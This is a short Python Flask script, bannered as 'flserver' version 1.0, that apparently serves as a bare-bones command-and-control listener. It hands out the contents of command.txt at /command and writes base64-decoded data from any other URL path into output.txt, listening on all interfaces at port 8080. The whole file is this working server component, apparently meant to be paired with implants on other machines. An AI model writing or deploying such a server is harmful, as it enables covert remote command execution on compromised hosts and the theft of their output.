# Application Banner
def hujambo():
    print('''
##################################################
# Tool    : flserver                             #
# Version : 1.0                                  #
# Coded with Python 2.7                          #
# Source  : https://github.com/pr2h/             #
##################################################
    ''')
    
from flask import Flask
import base64

app = Flask(__name__)
app.url_map.strict_slashes = False

with open('output.txt','w'):
    pass

with open('command.txt','w'):
    pass

@app.route('/command')
def getcommand():
    f = open('command.txt','r')
    command = f.readline()
    f.close()
    return command

@app.route('/<id>')
def getid(id):
    f = open('output.txt','w')
    f.write(base64.b64decode(id))
    f.close()
    return "200 OK"

app.run(host = '0.0.0.0', port=8080)
